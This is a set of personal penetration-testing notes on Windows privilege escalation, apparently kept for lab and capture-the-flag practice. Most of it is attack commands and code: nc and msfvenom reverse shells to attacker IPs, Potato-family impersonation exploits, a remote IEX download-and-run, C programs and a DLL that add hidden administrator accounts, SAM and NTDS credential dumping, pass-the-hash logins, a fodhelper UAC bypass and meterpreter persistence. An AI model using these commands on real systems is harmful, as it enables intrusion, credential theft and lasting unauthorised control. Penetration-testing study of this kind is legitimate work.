<h3 id="run-as"><a class="header" href="#run-as">Run As</a></h3>
<p>Runas which allows us to run a program as a different user. Runas can be used with local or domain accounts as long as the user has the ability to log on to the system.</p>
<pre><code>cmdkey /list # List stored Creds on the machine
where runas.exe # If we find or have the password

# Example Stores Creds:
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
</code></pre>
<pre><code># Transfer msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; shell.exe

# Using the above Stored Creds:
runas /savecred /user:&lt;USER found from cmdkey command above&gt; "shell.exe" 

# Change path below
C:\Windows\System32\runas.exe /env /noprofile /user:&lt;username&gt; &lt;password&gt; "c:\users\Public\nc.exe -nc &lt;attacker-ip&gt; 4444 -e cmd.exe"

# If the above doesn't work
runas /user:administrator cmd # Try this or below to get the reverse shell
runas /user:administrator "nc.exe -e cmd.exe &lt;IP&gt; 443"

# If the above doesn't work, try RunasCs
</code></pre>
<h3 id="runascs"><a class="header" href="#runascs">RunAsCs</a></h3>
<pre><code>https://github.com/antonioCoco/RunasCs/tree/master

Import-Module .\Invoke-RunasCs.ps1

Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "shell.exe"

or use to reverse shell:

.\r.exe C.Bum Tikkycoll_431012284 -r 10.10.14.6:443 cmd
</code></pre>
<h3 id="seimpersonateprivilege"><a class="header" href="#seimpersonateprivilege">SeImpersonatePrivilege</a></h3>
<p><a href="https://jlajara.gitlab.io/Potatoes_Windows_Privesc">Potato Info</a></p>
<pre><code># Detect
whoami /priv # See for SeImpersonatePrivilege to be enabled

If not, you might be able to use FullPowers to get this, like on the vulnlab media box:
https://seriotonctf.github.io/2023/10/19/Media-Vulnlab/

https://github.com/itm4n/FullPowers/releases/tag/v0.1

1. ./FullPowers.exe -c "C:\temp\nc64.exe 10.8.0.210 443 -e cmd" -z
2. Catch the shell
3. Use GodPotato or another to catch another shell w/ priv esc done.
4. .\gp.exe -cmd "C:\temp\nc64.exe -e cmd.exe 10.8.0.210 443"


## PrintSpoofer
https://github.com/itm4n/PrintSpoofer

# Attack, Transfer the PrintSpoofer64.exe
PrintSpoofer.exe -i -c cmd
.\PrintSpoofer32.exe -c "nc.exe 192.168.45.152 443 -e cmd"

##God Potato
https://github.com/BeichenDream/GodPotato

# If PrintSpoofer Doesn’t work then Try GodPotato - It’s the latest

.\GodPotato-NET35.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.152 443"

GodPotato-NET2.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.152 443"

GodPotato-NET4.exe -cmd "c:\wamp\www\nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.152 443"

## JuicyPotato
https://github.com/ohpe/juicy-potato

Juicy.Potato.x86.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c C:\wamp\www\nc.exe -e cmd.exe 192.168.45.152 443" -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}

JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c C:\wamp\www\nc.exe -e cmd.exe 192.168.45.152 443" -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}

https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md


## Lovely Potato

https://github.com/TsukiCTF/Lovely-Potato
Quick Guide
First clone this repo to your attacker machine which already has all of required dependencies:

root@attacker:~# git clone https://github.com/TsukiCTF/Lovely-Potato.git
root@attacker:~# cd Lovely-Potato
Then modify the two following variables in 'Invoke-LovelyPotato.ps1' as below (attacker machine IP, writable path on the victim machine):

$RemoteDir = "http://[AttackerIP]
$LocalPath = "[WritablePathOnVictimMachine]"
Now create a meterpreter binary on the attacker machine or use any other executable reverse shell:

root@attacker:~/Lovely-Potato# msfvenom -p windows/meterpreter/reverse_tcp LHOST=[AttackerIP] LPORT=[AttackerPort] -f exe -o meterpreter.exe
Start a web server in this repo to serve your meterpreter.exe and other dependencies:

root@attacker:~/Lovely-Potato# python3 -m http.server 80
On a new terminal, launch metasploit console (or any listener which handles whatever you are serving as a reverse shell):

root@attacker:~# msfdb run
msf5 &gt; # I'm going to omit setting up the multi handler as it is something you should already know
Finally enter below command on victim's powershell console and you MUST WAIT 10 minutes for reverse shell running as user NT AUTHORITY\SYSTEM!

PS &gt; IEX(New-Object Net.WebClient).DownloadString('http://[AttackerIP]/Invoke-LovelyPotato.ps1')



## RoguePotato
https://github.com/antonioCoco/RoguePotato
.\RoguePotato.exe -r 192.168.1.11 –l 9999 -e "C:\Windows\Temp\rev.exe

## JuicyPotatoNG.exe
https://github.com/antonioCoco/JuicyPotatoNG

JuicyPotatoNG.exe -t * -p "nc64.exe" -a "-e cmd.exe 10.8.1.213 80"
</code></pre>
<h3 id="generic-potato-from-cereal-htb"><a class="header" href="#generic-potato-from-cereal-htb">Generic Potato from Cereal HTB</a></h3>
<p><a href="https://0xdf.gitlab.io/2021/05/29/htb-cereal.html#genericpotato">Generic Potato</a>
<a href="https://jim-solomonx.medium.com/hackthebox-cereal-writeup-d1bf6133121f">Cereal HTB</a>
<a href="https://github.com/micahvandeusen/GenericPotato">Generic Potato</a>
<a href="https://github.com/JimKwikX/GenericPotato?source=post_page-----d1bf6133121f--------------------------------">Generic Potato</a>
<a href="https://micahvandeusen.com/the-power-of-seimpersonation/">Potato Blog</a></p>
<pre><code># A modified version of SweetPotato by @EthicalChaos to support impersonating authentication over HTTP and/or named pipes. This allows for local privilege escalation from SSRF and/or file writes.

.\GenericPotato.exe -p "c:\Users\sonny\Desktop\nc64.exe" -a "10.10.14.7 443 -e powershell" -e HTTP -l 8889

rlwarp nc -nvlp 443

curl -k -X "POST" -H "Content-Type: application/json" --data-binary '{"query":"mutation{updatePlant(plantId:2, version:2.2, sourceURL:\"[http://localhost:8889\](http://localhost:8889/)")}"}' '[http://localhost:8081/api/graphql'](http://localhost:8081/api/graphql')

</code></pre>
<h3 id="semanagevolumeexploit"><a class="header" href="#semanagevolumeexploit">SeManageVolumeExploit</a></h3>
<pre><code>Full Control over C:\

https://github.com/xct/SeManageVolumeAbuse
https://github.com/CsEnox/SeManageVolumeExploit

For example:

certutil -urlcache -split -f http://192.168.45.173:9090/SeManageVolumeExploit.exe

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.154 LPORT=135 -f dll -o tzres.dll

copy here: C:\windows\system32\wbem

certutil -urlcache -split -f http://192.168.45.173:9090/tzres.dll

Then run:
systeminfo





</code></pre>
<h3 id="sebackupprivilege"><a class="header" href="#sebackupprivilege"><strong><a href="https://github.com/giuliano108/SeBackupPrivilege">SeBackupPrivilege</a></strong></a></h3>
<pre><code># Import libraries
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Get-SeBackupPrivilege # ...or whoami /priv | findstr Backup SeBackupPrivilege is disabled

# Enable SeBackupPrivilege
Set-SeBackupPrivilege
Get-SeBackupPrivilege

# List Admin folder for example and steal a file
dir C:\enterpriseadmin\desktop\
Copy-FileSeBackupPrivilege C:\Users\enterpriseadmin\desktop\\flag.txt c:\users\enterpriseuser\flag.txt -Overwrite

Do this to get the Admin Hash with this:
https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/

nano raj.dsh
set context persistent nowriters
add volume c: alias raj
create
expose %raj% z:
unix2dos raj.dsh

cd C:\Temp
upload raj.dsh
diskshadow /s raj.dsh
robocopy /b z:\windows\ntds . ntds.dit

reg save hklm\system c:\Temp\system
cd C:\Temp
download ntds.dit
download system

impacket-secretsdump -ntds ntds.dit -system system local

For the hash, use the last one after the ":"
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d:::

evil-winrm -i 192.168.1.172 -u administrator -H "##Hash##"
evil-winrm -i 192.168.1.172 -u administrator -H "ee4457ae59f1e3fbd764e33d9cef123d"


</code></pre>
<h3 id="unquoted-service-path"><a class="header" href="#unquoted-service-path">Unquoted Service Path</a></h3>
<pre><code>-&gt; If there is space between the path and it is not enclosed in double quotes then we can exploit it. 
Example:
C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
-&gt; How system tries to execute an Unquoted service path
C:\Program.exe 
C:\Program Files\My.exe 
C:\Program Files\My Program\My.exe 
C:\Program Files\My Program\My service\service.exe


</code></pre>
<h4 id="detection"><a class="header" href="#detection">Detection</a></h4>
<pre><code># PowerView
Import-Module ./PowerView.ps1
Invoke-AllChecks OR Get-UnquotedService

OR

wmic service get displayname,pathname

OR

# Best one
Get-CimInstance -ClassName win32_service | Select Name,State,PathName # Powershell

OR

# Best one
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\"


Found the anomaly unquoted service path? # Services with no quotes &amp; spaces in path
Write Path and Service name in notes first # Service name can be found in winpeas, Powerview

icacls &lt;Path of the file&gt;
Example: C:\Program Files\yolo Apps\Current Version\yolo.exe

# TRY IN THIS FASHION ONLY
-&gt; icacls C:\Program Files, icacls C:\Program Files\yolo Apps, and vice versa.
-&gt; Once we see W or anything on the folder, pick up the next file and put binary
WE WANT W on BUILTIN/USERS or AUTHENTICATED USERS or USERNAME access

# Example
C:\Program Files\yolo Apps\Current Version\yolo.exe
icacls C:\Program Files\yolo Apps # Gives W on Users
Put malicious Current.exe in the yolo folder
</code></pre>
<h4 id="exploitation"><a class="header" href="#exploitation">Exploitation</a></h4>
<pre><code>1) msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;&gt; -f exe -o Common.exe
OR
2) addduser.c from shells module
OR
3) msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe2. 

Victim machine:
1. Place common.exe in 'C:\Program Files\&lt;Unquoted Path Service&gt;'
# directly transfer it to place OR using move below
# move "C:\users\ted\zen.exe" "C:\program files\zen\zen.exe"

2. sc start &lt;service_name&gt; or Start-Service &lt;service_name&gt; # Powershell
# Just try putting malicious binary, we don't know if it's running every second auto
# If the above doesn't work we need to restart, refer service binary module above

3. net localgroup administrators # To check if the user was added or nc to listen
</code></pre>
<h3 id="scheduled-tasks"><a class="header" href="#scheduled-tasks">Scheduled Tasks</a></h3>
<h4 id="detection-1"><a class="header" href="#detection-1">Detection</a></h4>
<pre><code># Generally backup files otherwise lots of noise

schtasks /query /fo LIST /v
# Look in Author, TaskName, Task To Run, Run As User, and Next Run Time fields.

OR

# PowerShell
Get-ScheduledTask | ft TaskName,TaskPath,State
Get-ScheduledTask | where {$_.TaskPath -notlike  "\Microsoft*"} | ft TaskName,TaskPath,State
</code></pre>
<h4 id="exploitation-1"><a class="header" href="#exploitation-1">Exploitation</a></h4>
<pre><code>1) icacls &lt;file.exe&gt; # Do we have M or F on BUILTIN/USERS or Username?
2) Replace the file directly with adduser.exe or msfvenom shell
msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;&gt; -f exe -o Common.exe
</code></pre>
<h3 id="alwaysinstallelevated"><a class="header" href="#alwaysinstallelevated">AlwaysInstallElevated</a></h3>
<pre><code># If the value for both is 1, then it's exploitable
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer

# Generate a malicious .msi and transfer to victim
msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f msi -o evil.msi

# Put the file in C:\Windows\Temp
msiexec /quiet /qn /i C:\Windows\Temp\evil.msi
# or try
evil.msi

# If doesn't work
-&gt; Try a Different port like 21
-&gt; Try Different Arch like x86 and x64
-&gt; Try putting the file in tmp or the user's desktop
</code></pre>
<h3 id="insecure-file-permission"><a class="header" href="#insecure-file-permission">Insecure File permission</a></h3>
<pre><code>Powershell 
Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}

icacls "C:\Program Files\test\bin\test.exe" # Path of the service\
Get-Acl C:\xampp\htdocs\logs | fl # Same as icacls but better

Check to see if this application has BUILTIN\USERS permission. If yes, Boom - Jackpot!
# Get msfvenom and replace that file with the move command
# Craft the Attack, ON KALI
</code></pre>
<h4 id="adduserc-1"><a class="header" href="#adduserc-1">adduser.c</a></h4>
<pre><code>

#include &lt;stdlib.h&gt;

int main ()
{
  int i;
  
  i = system ("net user evil password123 /add");
  i = system ("net localgroup administrators evil /add");
  
  return 0;
}
</code></pre>
<pre><code># Compile the code and transfer the binary to the Victim.
i686-w64-mingw32-gcc adduser.c -o adduser.exe

# Replace the service with our malicious binary on Victim.
move "C:\Program Files\test\bin\test.exe" "C:\Program Files\test\bin\test.exe"
move adduser.exe "C:\Program Files\test\bin\test.exe"
dir "C:\Program Files\test\bin\"

# Restart the service
wmic service where caption='test' get name, caption, state, startmode
shutdown /r /t 0
net localgroup Administrators
</code></pre>
<h4 id="another-example-of-binary-and-dll-hijacking"><a class="header" href="#another-example-of-binary-and-dll-hijacking">Another Example of Binary and DLL Hijacking</a></h4>
<pre><code>Service Binary HiJacking

Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

icacls "C:\xampp\apache\bin\httpd.exe"
icacls "C:\xampp\mysql\bin\mysqld.exe"

//adduser.c

#include &lt;stdlib.h&gt;

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}

x86_64-w64-mingw32-gcc adduser.c -o adduser.exe

iwr -uri http://192.168.45.225/adduser.exe -Outfile adduser.exe
move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
net stop mysql
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
whoami /priv
shutdown /r /t 0
Get-LocalGroupMember administrators
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
python3 -m http.server 80
iwr -uri http://192.168.45.225/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
Get-ModifiableServiceFile
Install-ServiceBinary -Name 'mysql'



$ACL = Get-Acl -Path "Folder1"
$User = New-Object System.Security.Principal.Ntaccount("TestUser1")
$ACL.SetOwner($User)
$ACL | Set-Acl -Path "Folder1"
Get-ACL -Path "Folder1"
</code></pre>
<pre><code>
## Service DLL Hijacking
---
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.
Listing 56 - Standard DLL search order on current Windows versions

Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
icacls .\Documents\BetaServ.exe
Load Process Monitor to filter for service
Restart-Service BetaService
$env:path

---

#include &lt;stdlib.h&gt;
#include &lt;windows.h&gt;

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave2 password123! /add");
  	    i = system ("net localgroup administrators dave2 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
Listing 62 - C++ DLL example code from Microsoft

x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
cd Documents
iwr -uri http://192.168.45.225/myDLL.dll -Outfile myDLL.dll
net user
Restart-Service BetaService
net user
net localgroup administrators


</code></pre>
<h3 id="gain-access-dll-hijacking"><a class="header" href="#gain-access-dll-hijacking">Gain Access DLL Hijacking</a></h3>
<p>https://github.com/ptoomey3/evilarc/tree/master</p>
<pre><code>This was from Bruno Vulnlab:
https://arz101.medium.com/vulnlab-bruno-f0129f60ac40

Basically just zip up a dll to a specific folder you have access to. 

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.154 LPORT=2222 -f dll &gt; test.dll


python evilarc.py -d 1 -p app Microsoft.DiaSymReader.Native.amd64.dll



</code></pre>
<h3 id="windows-subsystem"><a class="header" href="#windows-subsystem">Windows Subsystem</a></h3>
<pre><code>wsl whoami
wsl python -c &lt;'BIND_OR_REVERSE_SHELL_PYTHON_CODE&gt;
</code></pre>
<h3 id="uac-bypass"><a class="header" href="#uac-bypass">UAC Bypass</a></h3>
<p>User Account Control - The effect of UAC is that any application that wishes to perform an operation with a potential system-wide impact, cannot do so silently. This one is UAC Bypass - Fodhelper.exe.</p>
<pre><code># Check which level - if medium level integrity shell
whoami /groups

where fodhelper.exe # Find the location of fodhelper.exe on the system
</code></pre>
<h4 id="exploitation-2"><a class="header" href="#exploitation-2">Exploitation</a></h4>
<pre><code># This can directly give high-level integrity sometimes, one-time wonder. if works, works.
powershell.exe Start-Process cmd.exe -Verb runAs

Fodhelper.exe Bypass

# To see if UAC is enabled
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

# To see which level is configured
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

# Check for Medium Mandatory Level
whoami /groups | findstr Level

# Search for fodhelper.exe always
where /r C:\\windows fodhelper.exe

# Run this to check Powershell x86 or x64
powershell [Environment]::Is64BitProcess
# If False
C:\Windows\sysnative\cmd.exe

# Just Type these commands
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
# The operation was completed successfully. # YES
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ

# Generate shell64.exe with msfvenom [see if it's 64bit process]
SHELL NAME SHOULD BE THE FODHELPER.exe or whatever .exe is running.
msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;port&gt; -f exe &gt; &lt;shell-x64.exe&gt;
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "C:\Users\viewer\Desktop\fodhelper.exe" /f

# Execute Folhelper.exe again (Try each of those if one doesn't work)
# CHANGE NOTHING HERE, just the path try
C:\Windows\Sysnative\cmd.exe /c "powershell Start-Process C:\Windows\System32\fodhelper.exe -WindowStyle Hidden"
cmd.exe /c "powershell Start-Process C:\Windows\System32\fodhelper.exe -WindowStyle Hidden"

C:\Windows\Sysnative\cmd.exe /c "powershell Start-Process C:\Windows\SysWOW64\fodhelper.exe -WindowStyle Hidden"
cmd.exe /c "powershell Start-Process C:\Windows\SysWOW64\fodhelper.exe -WindowStyle Hidden"
</code></pre>
<h3 id="odt---htdocs"><a class="header" href="#odt---htdocs">.ODT - Htdocs</a></h3>
<ul>
<li><a href="https://0xdf.gitlab.io/2020/02/01/htb-re.html#prepare-document">HTB: RE</a></li>
</ul>
<h3 id="autoron"><a class="header" href="#autoron">Autoron</a></h3>
<ul>
<li><a href="https://tryhackme.com/room/windowsprivescarena">THM WinPriv Example</a></li>
</ul>
<h3 id="upnuphost"><a class="header" href="#upnuphost">upnuphost</a></h3>
<ul>
<li><a href="https://sohvaxus.github.io/content/winxp-sp1-privesc.html">WinXP Priv Esc</a></li>
</ul>
<h3 id="other-notes-i-had"><a class="header" href="#other-notes-i-had">Other Notes I had</a></h3>
<pre><code>
nc 192.168.236.222 4444
whoami /priv
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
python3 -m http.server 80
powershell
iwr -uri http://192.168.45.234/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
.\PrintSpoofer64.exe -i -c powershell.exe
whoami

---

more note20.txt
Alex's password expired, but he's on holiday for the next 4 weeks. Password reset by IT to the default

more note2.txt
Default password for new resets will be WelcomeToWinter0121


msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.234 LPORT=4444 -f dll &gt; EnterpriseServiceOptional.dll




</code></pre>
<h3 id="privesc-tools"><a class="header" href="#privesc-tools">privesc tools</a></h3>
<h3 id="check-if-win-logon-creds-are-working"><a class="header" href="#check-if-win-logon-creds-are-working">check if win-logon-creds are working</a></h3>
<h3 id="msf"><a class="header" href="#msf">msf</a></h3>
<ul>
<li><code>use exploit/windows/smb/psexec</code>
<ul>
<li><code>set PAYLOAD windows/x64/meterpreter/reverse_tcp</code></li>
<li><code>SHOW TARGETS</code> &gt; <code>set TARGET X</code></li>
</ul>
</li>
<li><code>use exploit/windows/smb/psexec_psh</code></li>
</ul>
<p><strong>Note:</strong> psexec &amp; evil-winrm uses <code>port 5985</code> (powershell remote access)</p>
<h3 id="psexec--smbexec--wmiexec"><a class="header" href="#psexec--smbexec--wmiexec">psexec | smbexec | wmiexec</a></h3>
<pre><code>NOTE: psexec, smbexec will give SYSTEM shell. wmiexec will give user shell.

impacket-psexec DOMAIN/USER:['PASS']@IP [-hashes :NTLMHASH]

impacket-smbexec DOMAIN/USER:['PASS']@IP [-hashes :NTLMHASH]

impacket-wmiexec DOMAIN/USER:['PASS']@IP [-hashes :NTLMHASH]

</code></pre>
<h3 id="evil-winrm-1"><a class="header" href="#evil-winrm-1">evil-winrm</a></h3>
<pre><code>**NOTE:** evil-winrm usually gives **medium integrity shells** for added administrator accounts. Even if new account has Administrator permissions, cannot actually perform administrative actions with it.

# only USER, no DOMAIN needed

evil-winrm -i IP -u USER [-H NT-HASH | -p PASS]

​

# custom options

PS&gt; menu

[+] Dll-Loader

[+] Donut-Loader

[+] Invoke-Binary

[+] Bypass-4MSI

[+] services

[+] upload

[+] download

</code></pre>
<h3 id="winexe"><a class="header" href="#winexe">winexe</a></h3>
<pre><code>winexe -U 'DOMAIN/USER%PASS' //IP cmd.exe
</code></pre>
<h3 id="pth-winexe"><a class="header" href="#pth-winexe">pth-winexe</a></h3>
<pre><code>pth-winexe -U 'DOMAIN/USER%HASH' //IP cmd.exe

# --system needs local admin hash

pth-winexe [--system] -U 'administrator%NTLM:HASH' //IP cmd.exe

</code></pre>
<h3 id="psexecexe"><a class="header" href="#psexecexe">PsExec.exe</a></h3>
<pre><code>PS&gt; .\PsExec64.exe -accepteula -i -s SHELL.exe

# i: Run process interactively

# s: Run remote process in the System account.

​

&gt; PSExec64.exe -i -u "nt authority\local service" SHELL.exe

# u: Run process as user-account &lt;&gt;

​

# Run executable with a different user:pass

PS&gt; .\PsExec.exe -accepteula -u USER -p PASS nc.exe IP PORT -e cmd.exe
</code></pre>
<h3 id="dump-sam"><a class="header" href="#dump-sam">Dump SAM</a></h3>
<h3 id="sam-hash-format"><a class="header" href="#sam-hash-format">SAM Hash Format</a></h3>
<pre><code>uid : rid : LM_Hash : NTLM_Hash
</code></pre>
<h3 id="empire-project"><a class="header" href="#empire-project">Empire Project</a></h3>
<pre><code>powershell.exe -exec bypass -Command "&amp; {Import-Module .\Invoke-PowerDump.ps1; Invoke-PowerDump}"
</code></pre>
<h3 id="manual-1"><a class="header" href="#manual-1">Manual</a></h3>
<pre><code># actual location
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SECURITY
C:\Windows\System32\config\SYSTEM
# other locations
C:\Windows\System32\config\RegBack
C:\Windows\Repair

reg save hklm\sam c:\Users\Public\ksam
reg save hklm\system c:\Users\Public\ksystem
reg save hklm\security c:\Users\Public\ksecurity

# on kali
samdump2 ksystem ksam
impacket-secrectsdump -sam ksam -security ksecurity -system ksystem LOCAL
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><p><strong>TL;DR</strong><br />
+ <strong>WHOAMI</strong>?<br />
whoami<br />
+ <strong>CAN I DO SPECIAL THINGS</strong>?<br />
WHOAMI /PRIV<br />
+ <strong>SERVICES</strong> <strong>--&gt;</strong> SERVICES AT BOOT <strong>&amp;</strong> SERVICES RAN THROUGH <strong>ICACLS</strong>.<strong>EXE</strong><br />
wmic service get name,startname<br />
NET START<br />
+ <strong>NETWORK</strong> <strong>CAPABILITIES?</strong> (CHECKS FOR 127)<br />
+ <strong>SHELL</strong> <strong>CAPABILITY</strong> <strong>--&gt;</strong> STAGED/NON-STAGED? FORMAT? ARCH? ENCODER? BIND/REVERSE?<br />
+ <strong>SHELL</strong> <strong>CAPABILITY</strong> <strong>--&gt;</strong> ENSURE CODE EXEC.<br />
+ <strong>NETWORK CAPABILITY.</strong><br />
NETSTAT -ANOY<br />
+ <strong>NET USERS</strong> (LATERAL MOVEMENT CAPABILITIES?)<br />
NET USERS<br />
NET LOCALGROUP<br />
NET USER <USERNAME> (AM I ADMIN? ANY SPECIAL GROUPS?)<br />
+ <strong>ADMIN CAPABILITY?</strong><br />
NET LOCALGROUP ADMINISTRATORS<br />
+ <strong>PERMITTED TRAFFIC</strong> <strong>CAPABILITY</strong>???<br />
netsh advfirewall firewall show rule name=<strong>all</strong><br />
netsh advfirewall firewall show rule name=<strong>inbound</strong><br />
netsh advfirewall firewall show rule name=<strong>outbounD</strong><br />
+ <strong>FILE TRANSFER CAPABILITY</strong>???<br />
CERTUTIL?<br />
FTP?<br />
TFTP?<br />
VB?<br />
PS?<br />
SMB?<br />
NFS?<br />
+ <strong>ANY SCHEDULED TASKS I/O OPERATIONS</strong>?<br />
C:\ &gt; schtasks /query /fo LIST /v &gt; schtasks.txt<br />
+ <strong>BINPATHS</strong>?<br />
SC.EXE<br />
[ <strong>+</strong> More to Come ]</p>
<p><strong>Other Articles:</strong><br />
<a href="https://www.fuzzysecurity.com/tutorials/16.html">https://www.fuzzysecurity.com/tutorials/16.html</a><br />
<a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation">https://book.hacktricks.xyz/windows/windows-local-privilege-escalation</a></p>
<p>+ <strong>Pro-tip - To prevent your shell from hanging as a result of any of these commands, prefix them with this!</strong><br />
cmd.exe /c <commands><br />
cmd.exe /c start <commands></p>
<p><strong>+ Pro-tip - Windows Powershell Execution Policy Bypass:</strong><br />
PowerShell.exe -ExecutionPolicy UnRestricted -File .shell.ps1</p>
<p>+ <strong>I just got shell on windows! What would S1REN do?</strong><br />
<strong>--&gt;</strong> Get a meterpreter shell.<br />
When it comes to a windows machine and receiving a low privilege shell - I do not mess around. I will always immediately work to maintain access and gain a more useful shell with meterpreter.<br />
msfconsole<br />
use exploit/multi/handler<br />
set PAYLOAD windows/meterpreter/reverse_tcp<br />
set LHOST <Attacking Machine IP><br />
set LPORT <Listening Port></p>
<p><strong>Maintaining Access with Meterpreter:</strong><br />
<a href="https://www.offensive-security.com/metasploit-unleashed/maintaining-access/">https://www.offensive-security.com/metasploit-unleashed/maintaining-access/</a></p>
<p><strong>meterpreter&gt;</strong> run persistence -U -i 5 -p 443 -r <Attacking Machine IP>
<strong>[*]</strong> Creating a <strong>persistent</strong> agent: <strong>LHOST</strong>=<Attacking Machine IP> <strong>LPORT</strong>=443 (interval=5 onboot=true)
<strong>[*]</strong> <strong>Persistent</strong> agent script is 613976 bytes long
<strong>[*]</strong> Uploaded the <strong>persistent</strong> agent to <strong>C:\WINDOWS\TEMP\yyPSPPEn.vbs</strong>
<strong>[*]</strong> Agent executed with <strong>PID 492</strong>
<strong>[*]</strong> <strong>Installing</strong> <strong>into autorun</strong> as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\YeYHdlEDygViABr
<strong>[*]</strong> <strong>Installed</strong> <strong>into</strong> <strong>autorun</strong> as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\YeYHdlEDygViABr
<strong>[*]</strong> For <strong>cleanup</strong> use command: run multi_console_command -rc /root/.msf4/logs/persistence/XEN-XP-SP2-BARE_20100821.2602/clean_up__20100821.2602.rc
<strong>meterpreter&gt;</strong>
<strong>meterpreter&gt;</strong> <strong>reboot</strong>
Rebooting...
<strong>meterpreter&gt;</strong> <strong>exit</strong>
<strong>meterpreter&gt;</strong> <strong>sysinfo</strong>
Computer: XEN-XP-SP2-BARE
OS      : Windows XP (Build 2600, Service Pack 2).
Arch    : x86
Language: en_US
<strong>meterpreter&gt;</strong></p>
<p>+ <strong>Forward out a <em>vulnerable</em> <em>service</em> with meterpreter.</strong><br />
<strong>meterpreter&gt;</strong> portfwd add -l <Attacker PORT> -p <Victim PORT> -r <Victim IP><br />
<strong>meterpreter&gt;</strong> portfwd add -l 3306 -p 3306 -r <Victim IP><br />
<strong>$</strong> rdesktop 0.0.0.0</p>
<p>+ <strong>Dude just do this with your meterpreter shell - trust S1REN.</strong><br />
use exploit/windows/local/service_permissions</p>
<p>+ <strong>Payloads</strong><br />
<strong>--&gt;</strong> Checkbox target machine's <strong>file arch</strong> (x86, x64).<br />
<strong>--&gt;</strong> Checkbox target machine for <em><strong>staged</strong></em> OR <em><strong>non-staged</strong></em> payloads..</p>
<p>+ <strong>Execute a Powershell Script.</strong><br />
powershell.exe 'C:\Tools*<em>privesc.ps1</em>*'</p>
<p>+ <strong>I need to enumerate out the System Information.</strong><br />
<em><strong>Save this info</strong></em> - it can be utilized with other windows privesc checking tools (based on installed patches, OS Versioning, etc)<br />
systeminfo</p>
<p>+ <strong>Who am I?</strong><br />
whoami<br />
echo %username%</p>
<p>+ <strong>Privileges</strong><br />
whoami /priv</p>
<p>+ <strong>List out all NT AUTHORITY/SYSTEM Services.</strong><br />
wmic service get name,startname |FINDSTR "NT"</p>
<p>+ <strong>Print Nightmare?</strong><br />
whoami /priv<br />
SetImpersonatePrivilege Enabled? 🙂</p>
<p>+ <strong>Domain Box?</strong><br />
Bloodhound? Sharphound?</p>
<p>+ <strong>Can we Install Things <em>Elevated</em>?</strong><br />
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated<br />
